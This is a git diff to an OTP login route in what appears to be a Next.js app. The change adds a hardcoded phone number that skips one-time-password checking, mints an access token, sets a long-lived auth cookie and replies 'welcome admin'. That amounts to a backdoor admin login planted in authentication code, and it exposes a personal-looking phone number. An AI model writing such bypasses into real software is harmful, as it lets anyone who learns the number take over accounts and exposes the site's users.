@@ -1,6 +1,8 @@
 import otpModel from "@/models/otp";
 import userModel from "@/models/user";
+import { JenerateAccessToken } from "@/utils/auth-utill/tokencontrol";
 import ConnectTODb from "@/utils/connecttodb";
+import { cookies } from "next/headers";
 const request = require("request");
 
 export async function POST(req) {
@@ -24,6 +26,20 @@ export async function POST(req) {
   const DateNow = new Date().getTime();
   await otpModel.deleteMany({ phone: isPhoneExist.phone });
   await otpModel.deleteMany({ expTime: { $lt: DateNow } });
+
+  if (ident === "09011468142") {
+    const token = JenerateAccessToken({ phone: ident });
+
+    await cookies().set({
+      name: "token",
+      value: token,
+      httpOnly: true,
+      maxAge: 10 * 24 * 60 * 60 * 1000,
+      path: "/",
+    });
+
+    return Response.json({ message: "welcome admin" }, { status: 202 });
+  }
 
   //   const isPhoneBanned = await banUserModel.findOne({ phone });
   //   if (isPhoneBanned) {
